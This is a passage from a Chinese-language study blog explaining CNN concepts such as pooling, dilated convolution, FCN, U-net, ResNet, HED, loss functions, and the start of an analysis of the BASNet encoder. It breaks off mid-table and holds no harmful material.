src="http://images2015.cnblogs.com/blog/1062917/201611/1062917-20161117211920029-1784506227.png" alt="这里写图片描述"></p><h5 id="Max-Pooling的作用"><a href="#Max-Pooling的作用" class="headerlink" title="Max Pooling的作用"></a>Max Pooling的作用</h5><p><a href="https://www.cnblogs.com/guoyaohua/p/8674228.html" target="_blank" rel="noopener">https://www.cnblogs.com/guoyaohua/p/8674228.html</a></p><p>1.invariance(不变性)，这种不变性包括translation(平移)，rotation(旋转)，scale(尺度)</p><p>2.扩大感受野</p><p>首先它第一个作用是降低feature map的尺寸，减少需要训练的参数；其次，因为有缩小的作用，所以之前的4个像素点，现在压缩成1个。那么，相当于透过这1个点，就可以看到前面的4个点。</p><h4 id="卷积与池化的区别"><a href="#卷积与池化的区别" class="headerlink" title="卷积与池化的区别"></a>卷积与池化的区别</h4><p>看到这里我有一个疑问，卷积与池化同样是提取特征，在使用上什么区别呢?</p><p>1:卷积过程导致的图像变小是为了提取特征。卷积操作相当于经过特征提取，已经改变了卷积核区域大小的像素变化，重新组合成新特征像素了。</p><p>2:池化下采样是为了降低特征的维度，池化操作可以起到平移不变性，如4个像素经过池化选泽一个具有代表的像素，给相似特征一定弹性。</p><p>虽然结果都是图像或者特征图变小，但是目的是不一样的。<strong>池化下采样比较粗暴，可能将有用的信息滤除掉，而卷积下采样过程控制了步进大小，信息融合较好，现在池化操作较少的被采用。</strong>反卷积和上采样也同理。</p><h4 id="卷积与池化特征图的计算"><a href="#卷积与池化特征图的计算" class="headerlink" title="卷积与池化特征图的计算"></a>卷积与池化特征图的计算</h4><p><a href="https://www.pianshen.com/article/30711004970/" target="_blank" rel="noopener">https://www.pianshen.com/article/30711004970/</a></p><p><strong>卷积:</strong></p><p>若图像为正方形：设输入图像尺寸为WxW，卷积核尺寸为FxF，步幅为S，Padding使用P,经过该卷积层后输出的图像尺寸为NxN：</p><p>$N=\frac{W-F+2P}{S}+1$</p><p>若图像为矩形：设输入图像尺寸为WxH，卷积核的尺寸为FxF，步幅为S，图像深度(通道数)为C，Padding使用P，则：</p><p>卷积后输出图像大小：</p><p>$N=\frac{W-F+2P}{S}+1$</p><p>$H=\frac{H-F+2P}{S}+1$</p><p>输出图像的通道数=C </p><p><strong>池化:</strong></p><p>设输入图像尺寸为WxH，其中W:图像宽，H:图像高，D:图像深度（通道数），卷积核的尺寸为FxF，S:步长</p><p>池化后输出图像大小：</p><p>$W=\frac{W-F}{S}+1$</p><p>$H=\frac{H-F}{S}+1$</p><p>池化后输出图像深度为D</p><p>当进行池化操作时，步长S就等于池化核的尺寸，如输入为24x24，池化核为4x4，则输出为$\frac{24-4}{4}+1 = 6$</p><p>若除不尽，则取较小的数，如池化核为7x7，则输出为$\frac{24-7}{7}+1 = 3.428 =3$，不是用四舍五入，就是取最小的整数，即使为3.9，也是 取3</p><p>式子是怎么来的我还不太理解emm…</p><p><strong>空洞卷积:</strong></p><p>$W=\frac{W-d(k-1)-1+2p}{s}+1$</p><p>d为dilation(空洞率)  p为padding k为kernel size</p><h4 id="high-level与low-level-feature"><a href="#high-level与low-level-feature" class="headerlink" title="high-level与low-level feature"></a>high-level与low-level feature</h4><p><a href="https://blog.csdn.net/nanhuaibeian/article/details/103305128" target="_blank" rel="noopener">https://blog.csdn.net/nanhuaibeian/article/details/103305128</a></p><p>Low-level feature： 通常是指图像中的一些小的细节信息，例如边缘（edge),角(corner),颜色(color),像素(pixeles), 梯度(gradients)等，这些信息可以通过滤波器、SIFT或HOG获取</p><p>high-level feature:是建立在low level feature之上的,可以用于图像中目标或物体形状的识别和检测,具有更丰富的语义信息</p><p>浅层的特征他的感受野较小，例如：他只从5x5的区域提取一个边缘信息。 high-level feature 他的感受野大， 他可以从100x100的区域总结一个语义信息。</p><h4 id="空洞卷积"><a href="#空洞卷积" class="headerlink" title="空洞卷积"></a>空洞卷积</h4><p><a href="https://www.zhihu.com/question/54149221" target="_blank" rel="noopener">https://www.zhihu.com/question/54149221</a></p><p>空洞卷积(扩张卷积，带孔卷积，dilated convolution)</p><p>在图像分割领域，图像输入到CNN中，FCN先像传统的CNN那样对图像做卷积再pooling，降低图像尺寸的同时增大感受野，但是由于图像分割预测是pixel-wise的输出，所以要将pooling后较小的图像尺寸upsampling到原始的图像尺寸进行预测（upsampling一般采用deconv反卷积操作），之前的pooling操作使得每个pixel预测都能看到较大感受野信息。</p><p>因此图像分割FCN中有两个关键，一个是pooling减小图像尺寸增大感受野，另一个是upsampling扩大图像尺寸。在先减小再增大尺寸的过程中，肯定有一些信息损失掉了，<strong>不通过pooling也能有较大的感受野看到更多的信息</strong>可以使用dilated conv。</p><p>空洞卷积核kernel 并不连续，也就是并不是所有的 pixel 都用来计算了。</p><p><img src="https://pic1.zhimg.com/50/v2-4959201e816888c6648f2e78cccfd253_hd.webp?source=1940ef5c" alt="img"></p><p>上图实际的卷积kernel  size还是3x3，但是空洞为1，也可以理解为kernel的size为7x7，但是只有图中的9个点的权重不为0，其余都为0。<strong>可以看到虽然kernel size只有3x3，但是这个卷积的感受野已经增大到了7x7。</strong></p><h5 id="dilation空洞率的计算"><a href="#dilation空洞率的计算" class="headerlink" title="dilation空洞率的计算"></a>dilation空洞率的计算</h5><p><a href="https://blog.csdn.net/chen1234520nnn/article/details/102516704" target="_blank" rel="noopener">https://blog.csdn.net/chen1234520nnn/article/details/102516704</a></p><p>膨胀后卷积核尺寸 = 膨胀系数 * (原始卷积核尺寸 - 1) + 1</p><p>以卷积核3*3为例，膨胀系数为2，那么卷积核膨胀之后，卷积核的单边尺寸就变成了2*(3-1)+1，即卷积核的尺寸变成了5*5。</p><p><img src="https://img-blog.csdnimg.cn/20191012113145392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMjM0NTIwbm5u,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>卷积核膨胀是将卷积核扩张到膨胀尺度约束的尺度中，并将原卷积核没有占用的区域填充零</strong></p><h3 id="FCN"><a href="#FCN" class="headerlink" title="FCN"></a>FCN</h3><p>paper:<a href="https://arxiv.org/abs/1411.4038" target="_blank" rel="noopener">https://arxiv.org/abs/1411.4038</a></p><p>对于一般的分类CNN网络，如VGG和Resnet，都会在网络的最后加入一些全连接层，经过softmax后就可以获得类别概率信息。但是这个概率信息是1维的，即只能标识整个图片的类别，不能标识每个像素点的类别，所以这种全连接方法不适用于图像分割。而FCN提出可以把后面几个全连接都换成卷积，这样就可以获得一张2维的feature map，后接softmax获得每个像素点的分类信息，从而解决了分割问题。</p><h4 id="上采样-Upsample"><a href="#上采样-Upsample" class="headerlink" title="上采样(Upsample)"></a>上采样(Upsample)</h4><p>在应用在计算机视觉的深度学习领域，由于输入图像通过卷积神经网络(CNN)提取特征后，输出的尺寸往往会变小，而有时我们需要将图像恢复到原来的尺寸以便进行进一步的计算(e.g.:图像的语义分割)，这个采用扩大图像尺寸，实现图像由小分辨率到大分辨率的映射的操作，叫做上采样(Upsample)。</p><p>上采样有3种常见的方法：双线性插值(bilinear)，反卷积(Transposed Convolution)，反池化(Unpooling)。</p><h5 id="反卷积"><a href="#反卷积" class="headerlink" title="反卷积"></a>反卷积</h5><p><a href="https://blog.csdn.net/jasonleesjtu/article/details/89791528" target="_blank" rel="noopener">https://blog.csdn.net/jasonleesjtu/article/details/89791528</a></p><p><a href="https://www.zhihu.com/question/48279880" target="_blank" rel="noopener">https://www.zhihu.com/question/48279880</a></p><blockquote><p>稀疏矩阵</p><p>在矩阵中，<strong>若数值为0的元素数目远远多于非0元素的数目，并且非0元素分布没有规律时</strong>，则称该矩阵为稀疏矩阵；与之相反，若非0元素数目占大多数时，则称该矩阵为稠密矩阵。定义非零元素的总数比上矩阵所有元素的总数为矩阵的稠密度。</p></blockquote><p>反卷积的操作只是恢复了输入矩阵的尺寸大小，并不能恢复输入矩阵的每个元素值。反卷积，也叫转置卷积，它并不是正向卷积的完全逆过程。</p><p><img src="https://pic1.zhimg.com/80/v2-78be59f3fee31730d49372bca2cec843_1440w.jpg?source=1940ef5c" alt="img"></p><p>反卷积的输入输出尺寸关系为：<img src="https://www.zhihu.com/equation?tex=o%3Ds%28i-1%29-2p%2Bk" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Balign%2A%7D+o%26%3Dsize%5C+of%5C+output%5C%5C+i%26%3Dsize%5C+of%5C+input%5C%5C+p%26%3Dpadding%5C%5C+s%26%3Dstrides+%5Cend%7Balign%2A%7D" alt="[公式]"></p><h5 id="双线性插值-bilinear-upsampling"><a href="#双线性插值-bilinear-upsampling" class="headerlink" title="双线性插值(bilinear upsampling)"></a>双线性插值(bilinear upsampling)</h5><p>FCN中上采样的过程用到的就是双线性插值法，双线性插值不需要学习任何的参数，通过人为的操作的。</p><p>用x和x0，x1的距离作为一个权重，用于y0和y1的加权。双线性插值本质上就是在两个方向上做线性插值。</p><p><a href="https://blog.csdn.net/qq_37577735/article/details/80041586" target="_blank" rel="noopener">https://blog.csdn.net/qq_37577735/article/details/80041586</a></p><h3 id="U-net"><a href="#U-net" class="headerlink" title="U-net"></a>U-net</h3><p><a href="https://segmentfault.com/a/1190000021798146" target="_blank" rel="noopener">https://segmentfault.com/a/1190000021798146</a></p><p><a href="https://blog.csdn.net/hduxiejun/article/details/71107285" target="_blank" rel="noopener">https://blog.csdn.net/hduxiejun/article/details/71107285</a></p><p>U-net的网络结构如下所示。左边为encoder部分，对输入进行下采样，下采样通过最大池化实现；右边为decoder部分，对encoder的输出进行上采样，恢复分辨率，上采样通过Upsample实现；中间为跳跃连接（Skip-connect）,进行特征融合。由于整个网络形似一个”U”,所以称为U-net。<br>网络中除了最后的输出层，其余所有卷积层均为3 * 3卷积。</p><p><img src="/2021/01/19/BASNet/image-20210430204730067.png" alt="image-20210430204730067"></p><p>除了全连接层，使用卷积神经网络进行语义分割存在的另一个大问题是池化层。池化层不仅扩大感受野、聚合语境从而造成了==位置信息的丢失。==但是，语义分割要求类别图完全贴合，因此需要保留位置信息。</p><p>U-Net 采用编码器-解码器结构。编码器逐渐减少池化层的空间维度，解码器逐步修复物体的细节和空间维度。编码器和解码器之间通常存在快捷连接，因此能帮助解码器更好地修复目标的细节。</p><h4 id="skip-connection"><a href="#skip-connection" class="headerlink" title="skip-connection"></a>skip-connection</h4><p>跳跃连接，通常用于残差网络中。(确实把U-net拉直成纵向排布可以看到Resnet中的跳跃连接)</p><p>在论文中叫拼接，在UNet有四个拼接操作。这一操作的目的是为了融合特征信息，融合了底层信息的位置信息与深层特征的语义信息，在拼接的时候要注意，不仅图片大小要一致（故要crop,是为了使图片大小一致）而且特征的维度（channels）也要才一样，才可以拼接。</p><p><strong>具体来说，当网络完成反卷积之后，就会将反卷积的结果与Encoder中对应步骤的特征图拼接起来，需要注意的是，Encoder特征图尺寸稍大，将其修剪过后进行拼接。</strong>拼接会保留了更多的维度/位置 信息，这使得后面的 layer 可以在浅层特征与深层特征自由选择，这对语义分割任务来说更有优势</p><p><em><code>copy and crop</code>中的<code>copy</code>就是<code>concatenate</code>而<code>crop</code>是为了让两者的长宽一致</em></p><h3 id="Segnet"><a href="#Segnet" class="headerlink" title="Segnet"></a>Segnet</h3><p><a href="https://blog.csdn.net/zhuzemin45/article/details/79709874" target="_blank" rel="noopener">https://blog.csdn.net/zhuzemin45/article/details/79709874</a></p><p>paper:<a href="https://arxiv.org/abs/1511.00561" target="_blank" rel="noopener">https://arxiv.org/abs/1511.00561</a></p><p>SegNet基于FCN，修改VGG-16网络得到的语义分割网络。</p><h4 id="网络架构-1"><a href="#网络架构-1" class="headerlink" title="网络架构"></a>网络架构</h4><p><img src="https://img-blog.csdn.net/20180327110125543?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXplbWluNDU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p>SegNet和FCN思路十分相似，只是Encoder,Decoder(Upsampling)使用的技术不一致。最终解码器的输出被送入soft-max分类器以独立的为每个像素产生类概率。</p><h3 id="Resnet"><a href="#Resnet" class="headerlink" title="Resnet"></a>Resnet</h3><p>解读:<a href="https://blog.csdn.net/csdnldp/article/details/78313087" target="_blank" rel="noopener">https://blog.csdn.net/csdnldp/article/details/78313087</a></p><p><a href="https://blog.csdn.net/sunny_yeah_/article/details/89430124" target="_blank" rel="noopener">https://blog.csdn.net/sunny_yeah_/article/details/89430124</a></p><p><a href="https://www.bilibili.com/video/BV1T7411T7wa" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1T7411T7wa</a></p><p>解决了梯度弥散/爆炸问题和退化问题</p><p>在残差网络中，不是让网络直接拟合原先的映射，而是拟合残差映射。</p><p>原来提取出的特征是H(x)，x就是估计值（也就是上一层ResNet输出的特征映射）。作者认为F(x)=H(x)-x的求解比H(x)的求解更简单。这样的话这一层的神经网络可以不用学习整个的输出，而是学习上一个网络输出的残差。</p><p><img src="https://z3.ax1x.com/2021/04/04/cKnghD.png" alt="cKnghD.png"></p><blockquote><p>如果是采用一般的卷积神经网络的化，原先咱们要求解的是H(x) = F(x)这个值。那么，我们现在假设，在我的网络达到某一个深度的时候，咱们的网络已经达到最优状态了，也就是说，此时的错误率是最低的时候，再往下加深网络的化就会出现退化问题（错误率上升的问题）。咱们现在要更新下一层网络的权值就会变得很麻烦，权值得是一个让下一层网络同样也是最优状态才行。对吧？<br>但是采用残差网络就能很好的解决这个问题。还是假设当前网络的深度能够使得错误率最低，如果继续增加咱们的ResNet，为了保证下一层的网络状态仍然是最优状态，咱们只需要把令F(x)=0就好啦！因为x是当前输出的最优解，为了让它成为下一层的最优解也就是希望咱们的输出H(x)=x的话，是不是只要让F(x)=0就行了？<br>当然上面提到的只是理想情况，咱们在真实测试的时候x肯定是很难达到最优的，但是总会有那么一个时刻它能够无限接近最优解。采用ResNet的话，也只用小小的更新F(x)部分的权重值就行啦！不用像一般的卷积层一样大动干戈！<br>————————————————<br>版权声明：本文为CSDN博主「sunny_yeah_」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/sunny_yeah_/article/details/89430124" target="_blank" rel="noopener">https://blog.csdn.net/sunny_yeah_/article/details/89430124</a></p></blockquote><p><strong>为什么层数多了准确率反而下降</strong></p><p>参考资料:<a href="https://zhuanlan.zhihu.com/p/67860570" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/67860570</a></p><p>虽然56层网络的解空间包含了20层网络的解空间，但是我们在训练网络用的是随机梯度下降策略，往往解到的不是全局最优解，而是局部的最优解，显而易见56层网络的解空间更加的复杂，所以导致使用随机梯度下降算法无法解到最优解。</p><p>如果深层网络的后面那些层是恒等映射，那么模型就退化为一个浅层网络。那现在要解决的就是学习恒等映射函数。  但是直接让一些层去<strong>拟合一个潜在的恒等映射函数H(x) = x</strong>，比较困难，这可能就是深层网络难以训练的原因。但是，如果把网络设计为H(x) =  F(x) + x，我们可以转换为学习一个残差函数F(x) = H(x) - x. 只要F(x)=0，就构成了一个恒等映射H(x) =  x. 而且，<strong>拟合残差比拟合恒等映射更加容易</strong>。</p><p><strong>引入残差后的映射对输出的变化更敏感。</strong>比如s输出从5.1变到5.2，映射F’的输出增加了1/51=2%，而对于残差结构输出从5.1到5.2，映射F是从0.1到0.2，增加了100%。明显后者输出变化对权重的调整作用更大，所以效果更好。<strong>残差的思想都是去掉相同的主体部分，从而突出微小的变化</strong></p><p>shortcut连接相当于简单执行了同等映射，不会产生额外的参数，也不会增加计算复杂度。 而且，整个网络可以依旧通过端到端的反向传播训练。</p><p>不同规格ResNet结构:</p><p><a href="https://imgtu.com/i/cKnoHP" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cKnoHP.png" alt="cKnoHP.png"></a></p><h4 id="BasicBlock和Bottleneck"><a href="#BasicBlock和Bottleneck" class="headerlink" title="BasicBlock和Bottleneck"></a>BasicBlock和Bottleneck</h4><p><a href="https://www.zhihu.com/question/413586557/answer/1402003639" target="_blank" rel="noopener">https://www.zhihu.com/question/413586557/answer/1402003639</a></p><p>在ResNet网络结构中会用到两种残差模块，一种是以两个3*3的卷积网络串接在一起作为一个残差模块，另外一种是1*1、3*3、1*1的3个卷积网络串接在一起作为一个残差模块。</p><p><a href="https://imgtu.com/i/cKnXcj" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cKnXcj.png" alt="cKnXcj.png"></a></p><h4 id="1-1卷积核的作用"><a href="#1-1卷积核的作用" class="headerlink" title="1*1卷积核的作用"></a>1*1卷积核的作用</h4><p><a href="https://blog.csdn.net/qq_27871973/article/details/82970640" target="_blank" rel="noopener">https://blog.csdn.net/qq_27871973/article/details/82970640</a></p><p>看到Bottleneck中使用了1*1卷积核，好奇起什么作用</p><p>对二维矩阵来说，相当于直接乘以2</p><p><img src="https://img-blog.csdn.net/2018100817560866?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI3ODcxOTcz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p>对三维矩阵来说</p><p>可以进行降维或者升维，也就是通过控制卷积核（通道数）实现，这个可以帮助减少模型参数，也可以对不同特征进行尺寸的归一化；同时也可以用于不同channel上特征的融合。</p><p>(?留坑了 三维不懂 所以Bottleneck也留坑)</p><h3 id="HED"><a href="#HED" class="headerlink" title="HED"></a>HED</h3><p>paper:<a href="https://arxiv.org/abs/1504.06375" target="_blank" rel="noopener">https://arxiv.org/abs/1504.06375</a></p><p>参考资料:</p><p><a href="https://blog.csdn.net/u014779538/article/details/92765963" target="_blank" rel="noopener">https://blog.csdn.net/u014779538/article/details/92765963</a></p><p><a href="https://blog.csdn.net/u012905422/article/details/52782615" target="_blank" rel="noopener">https://blog.csdn.net/u012905422/article/details/52782615</a></p><p><a href="https://zhuanlan.zhihu.com/p/35694372" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35694372</a></p><p>supervised by gt这块不懂 留坑了</p><p>这部分感谢研究生姐姐的帮助，我不懂HED中多尺度特征与supervised by gt之间的关系，感谢细心的解答QAQ</p><h4 id="ground-truth"><a href="#ground-truth" class="headerlink" title="ground truth"></a>ground truth</h4><p><a href="https://www.zhihu.com/question/22464082" target="_blank" rel="noopener">https://www.zhihu.com/question/22464082</a></p><p>在有监督学习中，数据是有标注的，以(x, t)的形式出现，其中x是输入数据，t是标注.<strong>正确的t标注是ground truth，</strong> 错误的标记则不是。</p><p>因此如果标注数据不是ground truth，那么loss的计算将会产生误差，从而影响到模型质量。</p><h4 id="监督学习与无监督学习"><a href="#监督学习与无监督学习" class="headerlink" title="监督学习与无监督学习"></a>监督学习与无监督学习</h4><h4 id="多尺度特征"><a href="#多尺度特征" class="headerlink" title="多尺度特征"></a>多尺度特征</h4><h5 id="图像金字塔"><a href="#图像金字塔" class="headerlink" title="图像金字塔"></a>图像金字塔</h5><p><a href="https://www.cnblogs.com/sddai/p/10330756.html" target="_blank" rel="noopener">https://www.cnblogs.com/sddai/p/10330756.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/94014493" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/94014493</a></p><p>图像金字塔是<strong>图像中多尺度表达</strong>的一种，最主要用于<strong>图像的分割</strong>，是一种<strong>以多分辨率来解释图像的有效但概念简单的结构</strong>。</p><p><strong>一幅图像的金字塔是一系列以金字塔形状排列的分辨率逐步降低，且来源于同一张原始图的图像集合</strong>。其通过梯次向下采样获得，直到达到某个终止条件才停止采样。</p><p>金字塔的底部是待处理图像的高分辨率表示，而顶部是低分辨率的近似。<strong>层级越高，则图像越小，分辨率越低</strong>。</p><p><img src="https://images2018.cnblogs.com/blog/1389184/201808/1389184-20180831140704177-401148282.png" alt="img"></p><p>高斯金字塔用来向下降采样图像(尺寸减半)，而拉普拉斯金字塔则用来从金字塔底层图像中向上采样重建一个图像(图片尺寸加倍)。</p><p><strong>高斯金字塔</strong></p><p>在计算机视觉与图像处理相关任务中，经常需要使用同一张图的不同尺寸的子图，我们可以使用高斯金字塔来获取这些子图。</p><p>下采样之前需要<strong>首先进行高斯滤波</strong></p><p>高斯噪声与高斯滤波:<a href="https://blog.csdn.net/u013007900/article/details/78181249（？留坑了）" target="_blank" rel="noopener">https://blog.csdn.net/u013007900/article/details/78181249（？留坑了）</a></p><p>下采样可以通过抛去图像中的偶数行和偶数列来实现，这样图像长宽各减少二分之一，面积减少四分之一。opencv提供了pyrDown()函数用于下采样。</p><p>随着下采样的进行，图像的分辨率不断降低，视觉效果也越来越模糊。</p><p><strong>拉普拉斯金字塔</strong></p><p>拉普拉斯金字塔可以认为是残差金字塔，用来存储下采样后图片与原始图片的差异。高斯金字塔中任意一张图进行下采样再进行上采样后与原图存在差异，<strong>因为下采样过程丢失的信息不能通过上采样来完全恢复</strong>，也就是说下采样是不可逆的。</p><p>我们需要记录<strong>再次上采样得到Up(Down(Gi))与原始图片Gi之间的差异</strong>，这就是拉普拉斯金字塔的核心思想</p><p>拉普拉斯金字塔就是<strong>记录高斯金字塔每一级下采样后再上采样与下采样前的差异</strong>，目的是为了能够完整的恢复出每一层级的下采样前图像。</p><p>$L_i=G_i-Up(Down(G_i))$</p><p><img src="https://pic3.zhimg.com/80/v2-1641deeb3eec372b6ff3fc436c8651b6_1440w.jpg" alt="img"></p><p>构建对应的拉普拉斯金字塔如下（第1级为高斯金字塔中最小尺寸的图，也就是高斯金字塔最后1级)</p><p><img src="https://pic3.zhimg.com/80/v2-d88c440419db98a262482d31b4a19e22_1440w.jpg" alt="img"></p><h5 id="多尺度模型架构"><a href="#多尺度模型架构" class="headerlink" title="多尺度模型架构"></a>多尺度模型架构</h5><p><a href="https://zhuanlan.zhihu.com/p/74710464" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/74710464</a></p><p>（先留坑）</p><h4 id="网络架构-2"><a href="#网络架构-2" class="headerlink" title="网络架构"></a>网络架构</h4><p><img src="/2021/01/19/BASNet/image-20210408204932290.png" alt="image-20210408204932290"></p><p>HED采用的多尺度特征结构。</p><p>Holistically ：表示边缘预测结果是基于端对端的</p><p>Nested：生成的Edge过程中，将许多尺度不同的图片进行fusion得到结果</p><p>作者在VGG-Net的基础上进行修改，在每个卷积层的后边加入一层 side output layer，<strong>在每个side output layer 上进行deep supervision learning</strong>，有助于结果向边缘检测方向进行。每个side output layer  将得到一个edge map，如下图：</p><p><img src="https://pic4.zhimg.com/80/v2-50f95cf6d020d31732014bf39b3289fb_720w.jpg" alt="img"></p><p>浅层越能检测出很细节的边缘信息，越深层越能体现一些语义分割上的信息，与ground truth 比较接近。最后通过一个fusion  layer将各个edge map 进行融合，在这个fusion layer中对所有的edge map  都进行loss，以及bp等操作（multi-loss）。</p><p>在VGG-16的5个block的Max  Pooling降采样之前，HED通过side_branch函数产生了5个分支,最后这5个side_branch的输出通过Concatenate操作合并在一起。网络的5个side_branch和一个fuse branch通过sigmoid激活函数后共同作为网络的输出，每个输出的尺寸均和输入图像相同。</p><p>还是不懂 代码也是- -留坑 </p><h2 id="loss"><a href="#loss" class="headerlink" title="loss"></a>loss</h2><h3 id="BCE"><a href="#BCE" class="headerlink" title="BCE"></a>BCE</h3><p>如何理解信息量、熵、相对熵、交叉熵:</p><p><a href="https://blog.csdn.net/Lison_Zhu/article/details/97234817" target="_blank" rel="noopener">https://blog.csdn.net/Lison_Zhu/article/details/97234817</a></p><p>BCE用于二分类 </p><p><img src="https://www.zhihu.com/equation?tex=Loss+%3D+-%28y+%5Ccdot+log%28%5Chat%7By%7D%29+%2B+%281-y%29+%5Ccdot+log%281+-+%5Chat%7By%7D%29%29" alt="[公式]"></p><p>其中 $\widehat{y}$ 是模型预测样本是正例的概率， y是样本标签，如果样本属于正例，取值为1，否则取值为0。</p><p>链接中举出青蛙的例子浅显易懂，如果忘了可以回去看一遍。</p><h3 id="SSIM-结构相似性"><a href="#SSIM-结构相似性" class="headerlink" title="SSIM(结构相似性)"></a>SSIM(结构相似性)</h3><p>SSIM是一种衡量两幅图片相似度的指标。</p><p>SSIM的输入就是两张图像，我们要得到其相似性的两张图像。其中一张是未经压缩的无失真图像(即ground truth)，另一张就是你恢复出的图像。</p><p>假设输入的两张图像是x和y</p><p>$SSIM(x,y)=[l(x,y)]^α[c(x,y)]^β[s(x,y)]^γ$</p><p>α&gt;0, β&gt;0, γ&gt;0</p><p>其中$l(x,y)=\frac{2μ_xμ_y+c_1}{\mu_x^2+\mu_y^2+c_1}$</p><p>c(x,y)=$\frac{2\sigma_{xy}+c_2}{\sigma_x^2+\sigma_y^2+c_2}$</p><p>s(x,y)=$\frac{\sigma_{xy}+c_3}{\sigma_x\sigma_y+c_3}$</p><p>其中l(x, y)是<strong>亮度比较</strong>，c(x,y)是<strong>对比度比较</strong>，s(x,y)是<strong>结构比较</strong>。$\mu_x$和$\mu_y$分别代表x,y的平均值，$\sigma_x和\sigma_y$分别代表x,y的标准差。$\sigma_{xy}$代表x和y的协方差。而$c_1,c_2,c_3$分别为常数，避免分母为0带来的系统错误。</p><p>在实际工程计算中，我们一般设定$\alpha=\beta=\gamma=1$,以及$c_3=c_2/2$,可以将SSIM简化为下:<br>SSIM(x,y)=$\frac{(2\mu_x\mu_y+c_1)(\sigma_{xy}+c_2)}{(\mu_x^2+\mu_y^2+c_1)(\sigma_x^2+\sigma_y^2+c_2)}$</p><p>总结:</p><ol><li>SSIM具有对称性，即SSIM(x,y)=SSIM(y,x)</li><li><strong>SSIM是一个0到1之间的数，越大表示输出图像和无失真图像的差距越小，即图像质量越好</strong>。当两幅图像一模一样时，SSIM=1</li></ol><h3 id="IOU"><a href="#IOU" class="headerlink" title="IOU"></a>IOU</h3><p><strong>交并比</strong>，是目标检测中最常用的指标</p><p><img src="https://www.zhihu.com/equation?tex=IOU+%3D++%5Cfrac%7B%28A%5Ccap+B%29%7D%7B%28A%5Ccup+B%29%7D" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=IOU+Loss+%3D+1+-+IOU" alt="[公式]"></p><p><strong>可以反映预测检测框与真实检测框的检测效果</strong></p><p>关于IOU/GIOU/DIOU/CIOU:</p><p><a href="https://www.cnblogs.com/wujianming-110117/p/13019343.html" target="_blank" rel="noopener">https://www.cnblogs.com/wujianming-110117/p/13019343.html</a></p><h2 id="optimizer"><a href="#optimizer" class="headerlink" title="optimizer"></a>optimizer</h2><h3 id="标准动量优化算法（Momentum）"><a href="#标准动量优化算法（Momentum）" class="headerlink" title="标准动量优化算法（Momentum）"></a>标准动量优化算法（Momentum）</h3><h3 id="RMSProp算法"><a href="#RMSProp算法" class="headerlink" title="RMSProp算法"></a>RMSProp算法</h3><h3 id="Adam算法"><a href="#Adam算法" class="headerlink" title="Adam算法"></a>Adam算法</h3><h2 id="网络架构分析"><a href="#网络架构分析" class="headerlink" title="网络架构分析"></a>网络架构分析</h2><p>有了上述基础知识和相关模型的了解，我们分析一下BASNET的架构。</p><p>目的是实现显著目标检测和物体分割</p><details><summary><p>BASNet相关资料</p></summary><p>    paper:<a href="https://openaccess.thecvf.com/content_CVPR_2019/papers/Qin_BASNet_Boundary-Aware_Salient_Object_Detection_CVPR_2019_paper.pdf" target="_blank" rel="noopener">戳这里</a></p><p>简介:<a href="https://mp.weixin.qq.com/s?__biz=MzA3MzI4MjgzMw==&mid=2650795924&idx=2&sn=1b15a2540ffb9220f00be0cbbd62cafd&chksm=871a2beab06da2fcd63c7b22ecde508e90b488533a3f97939ec1cfc65ec3ab823e3afe579a7f&mpshare=1&scene=23&srcid=1123k84nCTl7SzHKywymED4G&sharer_sharetime=1606132949286&sharer_shareid=8feb0cd9552063c70146726ba076ab86#rd" target="_blank" rel="noopener">戳这里</a></p>    <p>解读:<a href="https://blog.csdn.net/calvinpaean/article/details/101036249" target="_blank" rel="noopener">戳这里</a></p><p>github:<a href="https://github.com/NathanUA/BASNet" target="_blank" rel="noopener">戳这里</a></p></details><p><img src="https://img-blog.csdnimg.cn/20190920102120212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhbHZpbnBhZWFu,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Predict-Module"><a href="#Predict-Module" class="headerlink" title="Predict Module"></a>Predict Module</h3><h4 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h4><p>Encoder部分包含一个输入卷积层和六个由基本残差模块组成的stage。输入卷积层和前4个stages都是使用ResNet-34的层。</p><p>ResNet34架构:</p><p><img src="https://img-blog.csdnimg.cn/20190521090040152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjEzNTM5OQ==,size_16,color_FFFFFF,t_70" alt="img"></p><p>各层参数如下:</p><p>1.输入卷积层</p><div class="table-container"><table><thead><tr><th></th><th>Resnet34</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>224×224×</td><td>224×224×</td></tr><tr><td>kernel</td><td>7×7,64</td><td>3×3,64</td></tr><tr><td>padding</td><td>3</td><td>1</td></tr><tr><td>stride</td><td>2</td><td>1</td></tr><tr><td>output</td><td>112×112×64</td><td>224×224×64</td></tr></tbody></table></div><p>ResNet34 size减半而本论文中输入卷积层的特征图与输入图像有着相同的分辨率。</p><p>2.stage1</p><p>ResNet34有3x3，stride为2，padding为1的MaxPool</p><p>故经过MaxPool后 输出特征图为56x56。</p><p>而BASNet在输入层之后没有池化操作。</p><p>以下是一个ResBlock的参数，ResBlock_num=3。</p><div 